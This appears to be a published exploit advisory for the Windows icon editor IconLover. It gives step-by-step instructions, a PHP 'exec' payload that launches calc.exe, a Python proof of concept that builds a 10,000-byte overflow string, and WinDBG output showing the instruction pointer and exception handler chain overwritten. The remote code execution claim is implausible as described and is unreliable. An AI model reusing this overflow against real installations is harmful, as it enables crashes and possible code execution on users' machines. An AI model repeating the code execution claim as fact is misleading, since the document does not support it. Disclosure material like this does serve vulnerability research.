 Title Exploit : IconLover - Remote Code Execution / Stack Buffer Overflow Vulnerabilities
 Author : ZwX
 Software Vendor : http://www.aha-soft.com/
 Software Link: http://www.aha-soft.com/iconlover/index.htm
 Tested on: Windows 7 
 site : http://zwx.fr/
##################################################

##################################################
          Description Vulnerability :
##################################################

 A vulnerability in Input Address does not filter the type of PHP code that allowed me to Execute the Calculator.

##################################################
   Steps to Produce the Remote Code Execution :
##################################################

 1. Run IconLover.exe
 2. Click File -> New Icon Lybrary
 3. Click Lybrary -> Download 
 4. Paste the website address with a php file in input address 
 5. Click ok and Hide 
 6. Php code executed successfully

##################################################
             Code Exploit php :
##################################################

<?php
exec(&#039;C:\WINDOWS\system32\calc.exe&#039;);
echo &#039;"exec" test completed&#039;;
echo &#039;By ZwX&#039;;
?> 

##################################################
          Steps to Produce the Crash :
##################################################

1. Copy  the AAAA...string from bof.txt to clipboard
2. Run IconLover.exe
3. Click File -> New Icon Lybrary
4. Click Lybrary -> Download 
5. Paste it the input Website Adress AAAA....string click ok and Hide 
6. Software will Crash

##################################################
        Crash Analysis using WinDBG :
##################################################

Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=76db72cd esi=00000000 edi=00000000
eip=41414141 esp=0012f048 ebp=0012f068 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
41414141 ??              ???
0:000> !exchain
0012f05c: ntdll!RtlRaiseStatus+c8 (76db72cd)
0012fa88: 41414141
Invalid exception stack at 41414141
0:000> d 0012fa88
0012fa88  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0012fa98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0012faa8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0012fab8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0012fac8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0012fad8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0012fae8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0012faf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

##################################################
          Proof Of Concept :
##################################################

buffer = "\x41"*10000
 
file = open("bof.txt","w")
file.write(buffer)
file.close()
 
print "File Created"
print " Contact msk4@live.fr"

